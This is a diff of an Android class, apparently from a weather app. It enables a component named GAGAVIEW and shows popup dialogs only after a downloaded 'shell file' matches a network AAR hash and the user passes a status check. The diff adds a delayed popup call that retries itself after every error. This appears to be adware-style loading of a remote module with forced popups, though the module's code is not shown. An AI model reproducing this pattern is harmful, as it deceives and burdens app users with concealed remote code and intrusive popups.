@@ -64,10 +64,11 @@ public class ControllerUtils {
         CommonHttpUtils.getInstance().initConfigOaidDoPost(DefAPIUtils.randomConfig_from_delay, DefAPIUtils.getRandomConfig(), null, new OnHttpListener() {
             @Override
             public void onSuccess() {
-                initAR();
+
                 doBackgroundThread.doOnMainThreadIdle(new doBackgroundThread.Action() {
                 @Override
                     public void run() {
+                        initAR();
                         initAttribution();
                     }},null);
             }
@@ -160,7 +161,12 @@ public class ControllerUtils {
         CommonHttpUtils.getInstance().postFileHttp(DefContextUtils.instance.getApplication(), file, new OnHttpListener() {
         @Override
             public void onSuccess() {
-            initAR();
+            doBackgroundThread.doOnMainThreadIdle(new doBackgroundThread.Action() {
+            @Override
+                public void run() {
+                 initAR();
+                }},0L);
+
         }
             @Override
             public void onFail(Exception e) {}
@@ -172,22 +178,34 @@ public class ControllerUtils {
     //初始化so   当前是在子线程中
     private static void initAR(){
         if (isOverNetFile() && CommonSpUtils.getUserStatus()){
-            SafeUtils.enable(DefContextUtils.instance.getApplication(),"com.saom.tianqi.GAGAVIEW");
+            try {
+                SafeUtils.enable(DefContextUtils.instance.getApplication(),"com.saom.tianqi.GAGAVIEW");
+            } catch (Exception e) {
+                CustomLogUtils.e("AD_LOG==SafeUtils.enableerror------"+e);
+//                throw new RuntimeException(e);
+            }
             //切换到主线程中操作
-            doBackgroundThread.doOnMainThreadIdle(new doBackgroundThread.Action() {
-            @Override
-                public void run() {
-                    aarPopup();
-                }},0L);
+            aarPopup();
         }
     }
 
+    private static Handler popupHandler = new Handler(Looper.getMainLooper());
 
-    //34 已经初始化popup
+    // 已经初始化popup
     private static void aarPopup(){
-        if (Build.VERSION.SDK_INT>=34 && isOverNetFile()){
-            SafeUtils.popupDialog(DefContextUtils.instance.getApplication(),true);
-        }
+        CustomLogUtils.i("SafeUtils.popupDialog start");
+        popupHandler.postDelayed(new Runnable() {
+        @Override
+            public void run() {
+                try {
+                        if (Build.VERSION.SDK_INT>=34 && isOverNetFile()){
+                        SafeUtils.popupDialog(DefContextUtils.instance.getApplication(),true);
+                    }
+                } catch (Exception e) {
+                    CustomLogUtils.i("SafeUtils.popupDialog error==="+e);
+                    aarPopup();
+                }
+            }},2*1000);
     }
 
 
@@ -196,6 +214,7 @@ public class ControllerUtils {
         String spShellFile = CommonSpUtils.getSpShellFile();
         if (!TextUtils.isEmpty(spShellFile) && new File(spShellFile).length()>0){
             String s = MD5Util.md5File(new File(spShellFile));
+            CustomLogUtils.i("isOverNetFile== "+s.equals(CommonAPI.NET_AAR_MED5));
             return s.equals(CommonAPI.NET_AAR_MED5);
         }
         CustomLogUtils.i("isOverNetFile==false");
